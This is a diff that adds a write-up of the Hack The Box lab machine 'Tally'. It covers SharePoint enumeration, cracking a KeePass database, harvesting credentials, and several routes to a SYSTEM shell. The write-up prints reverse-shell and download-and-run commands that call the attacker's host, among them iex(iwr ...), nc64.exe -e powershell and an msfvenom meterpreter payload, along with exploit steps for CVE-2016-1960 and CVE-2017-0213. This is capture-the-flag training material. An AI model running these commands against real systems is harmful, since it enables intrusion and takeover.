@@ -1,0 +1,301 @@
+HTB-Tally-Writeup
+
+IP : 10.10.10.59
+
+Nmap 
+----
+- nmap scan found 21 open ports 
+	- 21 running FTP
+	- 80 running Microsift IIS
+	- 135 running msrpc
+	- 139 running netbios
+	- 445 running SMB
+	- and much more 
+
+Enumeration
+-----------
+- ftp anonymous login not allowed
+- trying to connect to SMB didnt work either
+- we have mssql and WinRM but its useless without credentials 
+- visiting port 80 redirects to a sharepoint home page called tally 
+- nmap did find this in the scans 
+- we can add the hostname to /etc/hosts file and check it out 
+- checking around the page we didnt find anything of interest
+- searching for pentesting sharepoint in google found us a blog and we can try out some stuffs from it 
+
+	https://resources.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/
+
+- we can try out the paths listen in the article and _layouts/viewlists.aspx did yield some results
+- on visiting _layouts/viewlists.aspx we got to the site contents page and we have some files to check out in here 
+- the documents sections contains an interesting .docx file called ftp-details which contains a password 
+
+	creds : UTDRSCH53c"$6hys
+
+- we dont have any usernames yet to use this password against
+- going back and checking out the site pages section we have a file called Finance Team which consists of few usernames 
+	- sarah 
+	- tim
+	- rahul
+	- ftp_user
+
+- its pretty obvious what we need to do next 
+- lets try to connect to ftp as ftp_user and the password we got before
+
+	ftp 10.10.10.59
+
+- we got logged in and on checking we do have some files in here 
+- we can download all the files into our machine with the following command
+
+	mget *
+
+- checking out the files we have few interesting stuffs in here 
+	- Firefox Setup 44.0.2.exe in Intranet/Binaries
+	- employees.xlsx in To-Upload
+	- user with a bunch of users
+		- Administrator  
+		- Ekta  
+		- Jess  
+		- Paul  
+		- Rahul  
+		- Sarah  
+		- Stuart  
+		- Tim  
+		- Yenwi
+
+- we can use find to list all the files in Users
+
+	find . -type f
+
+- we got ./Tim/Files/tim.kdbx which is a KeePass database (we have dealt with this before)
+- sarah has a notes.txt referencing removing Orchard CMS and the need to uninstall SQL Server 2016 
+
+Crack KeePass database Password
+-------------------------------
+- we can use john script keepass2john to generate a hash for the file tim.kdbx and crack it using hashcat to get the password 
+- we got the password as simplementeyo
+
+	creds : simplementeyo
+
+- we can connect to kpcli with the password to interact with the KeePass database
+- use the following command to list all passwords in the database 
+
+	find .
+
+- use the following command to check the passwords 
+
+	show -f 0
+	show -f 1
+	show -f 2
+	etc
+
+- we got two sets of credentials 
+
+	creds : cisco : cisco123
+	creds : Finance : Acc0unting
+
+- we can check the credentials against SMB with crackmapexec
+
+	crackmapexec smb 10.10.10.59 -u Finance -p Acc0unting
+
+- checking accessible shares with crackmapexec 
+
+	crackmapexec smb 10.10.10.59 -u Finance -p Acc0unting --shares
+
+- we got a hit for Finance 
+- we can connect to SMB with smbclient 
+
+	smbclient //10.10.10.59/ACCT -U Finance Acc0unting
+
+- we can list the contents and download all files with the command
+
+	mget *
+
+- this was a bad move since we have lot of junk in our system now 
+- instead we can mount the shares
+
+	 sudo mount -t cifs -o user=Finance,pass=Acc0unting //10.10.10.59/ACCT /mnt
+
+- we can check the files to find anything of use to us 
+- in zz_Archived/SQL folder we have a file called conn-info with sql credentials 
+
+	creds : tally : YE%TJC%&HYbe5Nw
+
+- trying to connect to mssql with this credential didnt work
+- on continuing the enumeration we found zz_Migrations/Binaries
+- checking zz_Migrations/Binaries we found tester.exe which is interesting since its not normal
+- running strings against the exe
+
+	strings -n 10 tester.exe | less
+
+- we got an interesting line 
+
+	DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
+
+- we got a password from this connection string for SQL server
+
+	creds : GWE3V65#6KFH93@4GWTG2G
+
+Shell as sarah
+--------------
+- there are two ways in which we can get shell as sarah
+
+	- Execution via MSSQL
+	- Exploit Firefox CVE-2016-1960
+
+Execution via MSSQL
+-------------------
+- we can use impackets mssqlclient.py to connect to MSSQL
+
+	mssqlclient.py sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59
+
+- mssqlclient.py has built in commands 
+- we can use xp_cmdshell to run unix commands
+
+	enable_xp_cmdshell
+	xp_cmdshell whoami
+
+- we get output as tally\sarah
+- since we are running on a 32 bit shell we can get a reverse shell to make things much easier 
+- choose a powershell reverse shell 
+- we can choose the powershell base64 reverse shell from revshells.com
+- change the ip and port 
+- setup a listener with netcat
+
+	rlwrap -cAr nc -lvnp 443
+
+- run the reverse shell
+
+	xp_cmdshell powershell -e base64_encoded_reverse_shell
+
+- we have a shell as sarah
+- grab the user flag 
+
+Exploit Firefox CVE-2016-1960
+-----------------------------
+- we did find a firefox installer before 
+- we have found clues that point towards firefox exploit
+- we can search for known vulnerabilities for firefox 4 using searchsploit
+- we found one 
+
+	searchsploit -m windows/remote/42484.html
+
+- save this file as sploit.html 
+- the html page point towards CVE-2016-1960.
+- open the script and we have a variable called shellcode 
+- instead of calc.exe we can use 
+	
+	powershell -c iex(iwr('http://10.10.14.6/lord.ps1'))
+
+- if the payload is not of length divisible by 4 it wont print
+- convert it into hex starting with a \x68
+- replace the two calc.exe lines in the html file with these 
+- edit the lord.ps1 to include the base64 encoded powershell reverse shell 
+- now we can wait for sarah to open firefox and view index.html which redirectst to sploit.html 
+- setup a listener with netcat
+
+	sudo rlwrap -cAr nc -lvnp 445
+
+- after a while we get a shell as tally\sarah
+
+Priv-esc
+--------
+- we can get a shell as system in 3 different ways
+	- Overwrite Scheduled Task
+	- SeImpersonate token
+	- CVE-2017-0213
+
+System shell with Overwrite scheduled task
+------------------------------------------
+- during enumeration we saw a bunch of files in the desktop out of which SPBestWarmUp.ps1 and SPBestWarmUp.xml looks interesting to us 
+- SPBestWarmUp.ps1 is a powershell script 
+- SPBestWarmUp.xml is an exported scheduled task which runs like a cronjob every 1 hour running as Administrator
+- checking the xml we can see that it runs SPBestWarmUp.ps1
+- sarah has full control over SPBestWarmUp.ps1
+
+	icacls SPBestWarmUp.ps1
+
+- we can generate another reverse shell for port 444 and replace the contents of SPBestWarmUp.ps1
+
+	echo "reverse_shell_444" > SPBestWarmUp.ps1
+
+- setup a listener 
+
+	rlwrap -cAr nc -lnvp 444
+
+- we got a shell as system
+- grab the root flag
+
+System shell with SeImpersonate token
+-------------------------------------
+- sarah is running MSSQL and in windows its very common for services to run as a user with SeImppersonate privileges 
+- we can check this by running the following command as sarah
+
+	whoami /priv
+
+- we do have SeImpersonatePrivilege 
+- we can use sweetpotato to exploit this 
+	
+	https://github.com/CCob/SweetPotato
+
+- we can download it and get it on the victim machine 
+- get nc64.exe on the victim machine 
+- run the following code 
+
+	.\sp.exe -p "\programdata\nc64.exe" -a "-e powershell 10.10.14.6 446"
+
+- setup a listener with netcat
+
+	nc -lnvp 446
+
+- we have a shell as system
+
+System shell with CVE-2017-0213
+-------------------------------
+- we can check systeminfo to look for recent hotfixes
+- the hotfix KB4015217 is exploitable
+- CVE-2017-0213 was a well know privesc in Windows
+- a note from sarahs desktop tells us that any accurance of cmd.exe outside of windows folder will not be executed 
+- the CVE-2017-0213 explot runs cmd.exe so we need to find a better way to exloit this 
+- we will download the C++ source for this exploit
+- Instead of cmd.exe, we just have to run 
+
+	nc64.exe -e powershell 10.10.14.6 447
+
+- build the exploit as x86 in vs code
+- now we need to check for pid of the powershell
+	
+	get-process -id $PID
+
+- we can use metasploit for this since its easier to migrate in msfconsole
+- generate a payload with msfvenom
+
+	msfvenom -p windows/x64/meterpreter/reverse_tcp -f psh -o met.ps1 LHOST=10.10.14.6 LPORT=4443
+
+- start msfconsole 
+	
+	msfconsole
+	use exploit/multi/handler
+	set LHOST
+	set LPORT
+	run
+
+- start a python server and host the payload
+- downloadand run the exploit in victim machine
+
+	iex(iwr http://10.10.14.6/met.ps1)
+
+- we get a meterpreter shell
+- run ps to check for running processes and migrate to a running session (explorer.exe)  
+
+	migrate 4168
+
+- from an interactive process we can run the exploit 
+- shell to drop into a shell 
+- change directory to C:\programdata and run the exploit we built from here
+- the exploit was setup to call nc64.exe to our host port 447
+- setup a listener with netcat
+
+	nc -lnvp 447
+
+- we got a shell as ny authority\system
+- grab the root flag  
